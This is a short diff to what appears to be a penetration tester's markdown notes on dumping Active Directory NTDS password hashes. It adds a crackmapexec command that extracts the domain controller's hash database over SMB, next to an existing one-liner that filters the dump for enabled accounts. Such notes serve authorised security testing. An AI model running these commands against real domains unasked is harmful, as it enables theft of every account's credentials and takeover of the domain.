@@ -17,3 +17,10 @@ The tidy up the hashes
 ```
 cat myhashes.ntds | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -d"(" -f1
 ```
+
+## crackmapexec
+
+```
+crackmapexec smb <DC-IP> -u <user> -p <password> --ntds
+```
+
